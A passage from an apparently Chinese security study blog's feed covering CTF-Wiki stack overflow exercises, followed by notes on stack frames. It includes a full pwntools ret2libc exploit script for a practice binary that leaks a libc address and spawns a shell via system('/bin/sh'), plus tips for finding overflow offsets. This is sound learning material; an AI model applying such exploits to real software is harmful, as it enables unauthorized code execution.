的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ol><p>EXP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">## 导入工具</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">## 本地连接</span><br><span class="line">sh = process(&apos;./ret2libc3&apos;)</span><br><span class="line">## 将文件加载入进程</span><br><span class="line">ret2libc3 = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line"></span><br><span class="line">##简化libc库中函数地址的表示方法</span><br><span class="line">puts_plt = ret2libc3.plt[&apos;puts&apos;]</span><br><span class="line">libc_start_main_got = ret2libc3.got[&apos;__libc_start_main&apos;]</span><br><span class="line">main = ret2libc3.symbols[&apos;main&apos;]</span><br><span class="line"></span><br><span class="line">## 监视程序进行到哪一步，提醒自己</span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">## puts函数泄露出start_main函数地址</span><br><span class="line">payload = flat([&apos;A&apos; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line"></span><br><span class="line">## 在输出前面字符串后，将payload输入</span><br><span class="line">sh.sendlineafter(&apos;Can you find it !?&apos;, payload)</span><br><span class="line"></span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[0:4])</span><br><span class="line">##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。</span><br><span class="line">libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr)</span><br><span class="line">## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&apos;__libc_start_main&apos;)</span><br><span class="line">## 已知基地址与相对地址，得到绝对地址</span><br><span class="line">system_addr = libcbase + libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line"></span><br><span class="line">## 监视程序进行到哪一步</span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;A&apos; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>0X05–稍作总结：</strong></p><p>ret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。</p><p><strong>0X06–MISC:</strong></p><p>1.最简单栈溢出，一套工具解决。</p><p>python <a href="http://pattern.py/" target="_blank" rel="noopener">pattern.py</a> create 150<br>        gdb X<br>        run<br>        (input)<br>        q(uit)<br>        python <a href="http://pattern.py/" target="_blank" rel="noopener">pattern.py</a> offset (address)</p><p>即可得到溢出地址</p><p>2.注意是返回地址，不是/bin/sh本身在栈上。</p><p>3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。</p><p>4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。</p><p>5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。</p><p>6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。</p><p>7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。</p><p>8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。</p><p>9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。</p><p>10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。<br>        PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。</p><p>11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分：<br>1.<strong>栈区（stack）</strong>：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.<strong>堆区（heap)</strong>： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回   收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.<strong>数据区</strong>：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.<strong>代码区</strong>：存放函数体的二进制代码。</p><p>12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。</p><p>13.常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><p>计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><p><strong>0X06–尚存在的问题:</strong></p><p>1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。</p><p>2.ESP的调试为什么断点下在CALL处。</p><p>3.buf两端的问题。</p><p>4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。<br>解决此问题最简单的方法就是开启core dump功能，即：<br>ulimit -c unlimited<br>sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’<br>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p><p>CTF-Wiki&gt;Linux Pwn:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">Stack Overflow principle</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">Basic ROP</a></p><p><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" target="_blank" rel="noopener">系统调用</a></p><p><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">Github上Libc版本库</a></p><p><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LibcSearcher工具</a></p><p><a href="https://www.anquanke.com/post/id/85831" target="_blank" rel="noopener">现代栈溢出利用技术基础：ROP</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="noopener">一步一步学ROP之linux_x86篇</a></p><p><a href="https://segmentfault.com/a/1190000007406442" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p><p><a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p><p><a href="https://paper.seebug.org/272/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（下）</a></p><p><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">Linux下pwn从入门到放弃</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CTF-Wiki中几道例题的思路&lt;/p&gt;
&lt;p&gt;从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0X01–栈溢出的基本原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;栈溢出指的是程序向栈中某个变量中写入的字节数超过了这
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>栈帧（stack frame）</title>
    <link href="http://qywcysry.github.io/2019/06/19/Stack%20Frame/"/>
    <id>http://qywcysry.github.io/2019/06/19/Stack Frame/</id>
    <published>2019-06-18T19:03:07.373Z</published>
    <updated>2019-06-19T12:41:09.196Z</updated>
    
    <content type="html"><![CDATA[<p>1.栈帧的作用：在程序中用于声明变量，调用函数。是利用EBP（栈帧指针）寄存器访问栈内局部变量，参数，函数返回地址等的手段。</p><p>2.在储存局部变量的值之前，都会执行SUB指令，为局部变量开辟空间。</p><p>3.汇编中的DWORD PTR SS:[EBP-4]理解为指针，意为地址EBP-4处有一个4字节大小 的内存空间。此句中，SS是Segment Memory Model的缩写，表示栈段，在Windows（使用段内存模型）下需要指出。EBP是指向栈的寄存器，所以加上SS寄存器。DWORD PTR与SS等字符串可以在OD设置中隐藏。</p><p>4.调用一个函数之前，先开辟出内存空间，在将参数压入栈，最后在执行函数之前，将返回地址压入栈。执行完毕之后将删除函数栈帧并返回至PUSH的返回地址。</p><p>5.注意参数入栈的顺序与C语言中参数顺序恰好相反（参数的逆向存储）。</p><p>6.调用约定（Calling Convention）：被调函数执行完后，由函数的调用者负责清理存储在栈中的参数，这种方式称为cdecl方式。由被调用者负责清理保存在栈中的参数，称为stdcall方式。</p><p>7.ESP为栈顶指针，EBP为栈帧指针。程序运行过程中，ESP是随时变化的，访问内存中的局部变量和参数等如果以此为基址会十分困难。所以程序开始时会PUSH EBP,MOV EBP,ESP.将ESP的值保存在EBP中并且维持在函数内部，这样无论ESP如何变化，以EBP为基准都能准确地访问到局部变量与参数。执行完这两条命令，就可以说栈帧已经生成了。</p><p>8.XOR命令用来进行异或运算，Exclusive OR bit，其特点为两个相同的值进行异或运算的结果为0.XOR命令的执行速度比 MOV EAX,0 要快，常用于寄存器初始化操作。</p><p>9.编译器中的”优化“（optimization）选项开启后，编译出来的简单函数将不会生成栈帧。</p><p>10.牢记：栈是用来存放参数，变量，地址等数据的，不是用来存放代码的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.栈帧的作用：在程序中用于声明变量，调用函数。是利用EBP（栈帧指针）寄存器访问栈内局部变量，参数，函数返回地址等的手段。&lt;/p&gt;
&lt;p&gt;2.在储存局部变量的值之前，都会执行SUB指令，为局部变量开辟空间。&lt;/p&gt;
&lt;p&gt;3.汇编中的DWORD PTR SS:[EBP-4
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Genesis</title>
    <link href="http://qywcysry.github.io/2019/06/17/Genesis/"/>
    <id>http://qywcysry.github.io/2019/06/17/Genesis/</id>
    <published>2019-06-17T14:10:28.370Z</published>
    <updated>2019-06-18T18:56:50.489Z</updated>
    
    <content type="html"><![CDATA[<p>Earthquake and Blog</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Earthquake and Blog&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
</feed>
